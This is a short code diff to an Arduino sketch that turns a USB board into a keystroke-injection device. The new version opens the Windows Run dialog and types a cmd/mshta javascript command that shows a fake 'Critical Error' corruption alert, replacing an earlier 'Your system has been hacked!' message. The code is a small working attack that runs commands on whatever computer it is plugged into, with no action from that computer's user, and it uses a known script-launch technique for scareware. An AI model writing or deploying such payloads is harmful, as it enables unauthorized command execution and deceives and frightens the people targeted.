@@ -1,14 +1,15 @@
-#include "Arduino.h"
-#include "USB.h"
-#include "USBHIDKeyboard.h"
-
+#include <USBHIDKeyboard.h>
 USBHIDKeyboard Keyboard;
 
 void setup() {
-    USB.begin();
-    Keyboard.begin();
-    delay(2000);
-    Keyboard.println("cmd /c msg * \"Your system has been hacked!\"");
+  Keyboard.begin();
+  delay(3000);
+  
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.println("cmd /c mshta javascript:alert('Critical Error!\\nYour system is corrupted!');close()");
 }
 
 void loop() {}
